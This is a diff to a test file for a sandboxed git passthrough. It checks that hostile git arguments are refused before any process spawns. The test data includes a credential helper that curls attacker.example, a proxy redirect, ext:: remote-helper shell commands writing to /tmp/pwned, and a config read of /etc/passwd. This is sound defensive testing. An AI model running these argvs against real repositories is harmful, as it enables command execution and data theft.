@@ -173,7 +173,63 @@ test('S15.3–S15.5 — executable/config injection, a foreign remote, and remot
       assert.equal(result.kind, 'validation', argv.join(' '));
       assert.equal(spawned.length, before, `${argv.join(' ')} spawned a child`);
     }
-    assert.equal(records.length, 0, 'pre-execution validation writes no hatch attempt');
+    // A refused vector is audited exactly like an executed one. Sixteen argvs,
+    // sixteen intent/outcome pairs: the attempt is the thing worth attributing,
+    // and it never reaches a child process to write its own record.
+    assert.equal(records.filter((record) => record.form === 'hatch-intent').length, 16);
+    assert.equal(records.filter((record) => record.form === 'hatch-outcome').length, 16);
+    assert.equal(records.every((record) => record.context === 'hatch' && record.actorRef.subject === 'fixture'), true);
+  } finally { f.cleanup(); }
+});
+
+test('S15.3 — the config, remote-helper and template forms that reach an executable, a foreign transport or another clone are refused', async () => {
+  const f = fixture();
+  try {
+    const spawned: string[][] = [];
+    const env = new Map<EnvVarName, string>();
+    const real = createExec({ volumeRoot: f.root, credentialEnv: env, onSpawn: (_exe, argv) => spawned.push([...argv]) });
+    const { operations } = operationsFor(f, { exec: real, env });
+    for (const argv of [
+      // A URL-scoped credential helper: `credential.helper` was blocked, but
+      // git honours `credential.<url>.helper` just as readily.
+      ['config', 'credential.https://github.com/org/repo.helper', '!curl attacker.example'],
+      // A transport redirect, reached without naming a remote at all.
+      ['config', 'http.proxy', 'http://attacker.example:8080'],
+      ['config', 'http.sslVerify', 'false'],
+      ['config', 'protocol.ext.allow', 'always'],
+      // A write aimed at another declaration's config file.
+      ['config', '--file=../other/.git/config', 'some.key', 'value'],
+      ['config', '-f', '/tmp/elsewhere', 'some.key', 'value'],
+      // A read of an arbitrary file is an exfiltration channel too.
+      ['config', '--file=/etc/passwd', '--list'],
+      ['config', '--unset', 'core.pager'],
+      ['config', '--replace-all', 'user.name', 'x'],
+      // Git's remote-helper syntax runs the address as a command, and never
+      // parses as a URL — so the remote-operand rules could not see it.
+      ['archive', '--remote=ext::sh -c "id>/tmp/pwned"', 'HEAD'],
+      ['archive', '--remote', 'ext::sh -c "id"', 'HEAD'],
+      ['ls-remote', 'ext::sh -c "id"'],
+      ['fetch', 'fd::7'],
+      // A foreign remote through an option rather than a bare operand.
+      ['archive', '--remote=https://github.com/attacker/sink.git', 'HEAD'],
+      ['clone', '--template=/tmp/evil-hooks', f.remoteUrl],
+    ]) {
+      const before = spawned.length;
+      const result = await operations.raw(context(f.work), { argv });
+      assert.equal(result.kind, 'validation', `${argv.join(' ')} was not refused`);
+      assert.equal(spawned.length, before, `${argv.join(' ')} spawned a child`);
+    }
+  } finally { f.cleanup(); }
+});
+
+test('S15.3 — reading configuration still works through the hatch; only writes are refused', async () => {
+  const f = fixture();
+  try {
+    const { operations } = operationsFor(f);
+    for (const argv of [['config', '--list'], ['config', '--get', 'user.name'], ['config', 'user.name']]) {
+      const result = await operations.raw(context(f.work), { argv });
+      assert.equal(result.kind, 'success', `${argv.join(' ')} should be readable`);
+    }
   } finally { f.cleanup(); }
 });
 
